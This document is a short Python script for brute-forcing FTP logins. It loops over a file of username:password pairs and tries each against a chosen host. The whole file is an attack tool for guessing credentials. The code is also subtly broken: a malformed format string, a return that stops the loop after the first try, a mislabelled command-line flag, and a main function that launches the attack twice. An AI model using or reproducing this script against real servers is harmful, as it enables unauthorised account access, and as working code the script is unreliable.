import ftplib
import argparse


def brute_login(hostname, password):
    pwrd = open(password, 'r')
    for line in pwrd.readlines():
        username = line.split(':')[0]
        u_password = line.split(':')[1].strip('\r').strip('\n')

        print('Trying: {} - {}'.format(username, u_password))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, u_password)
            print('Logon succed.\nUsername: {} - Password: {]'.format(username, u_password))
            ftp.quit()
            return username, u_password

        except Exception as e:
            pass

        print('Logon failed! ')
        return None, None


def main():
    parser = argparse.ArgumentParser(prog='brute ftp', usage='brute -uf <username list> -pf <password list>')
    parser.add_argument('-uf', '--hostname', help='specify target host', type=str)
    parser.add_argument('-pf', '--password_list', help='specify password file', type=str)

    args = parser.parse_args()

    hostname = args.hostname
    password_list = args.password_list

    print(parser.usage) and exit(0) if hostname is None or password_list is None else brute_login(hostname, password_list)

    if hostname is None or password_list is None:
        print(parser.usage)
        exit(0)

    brute_login(hostname, password_list)


if __name__ == '__main__':
    main()
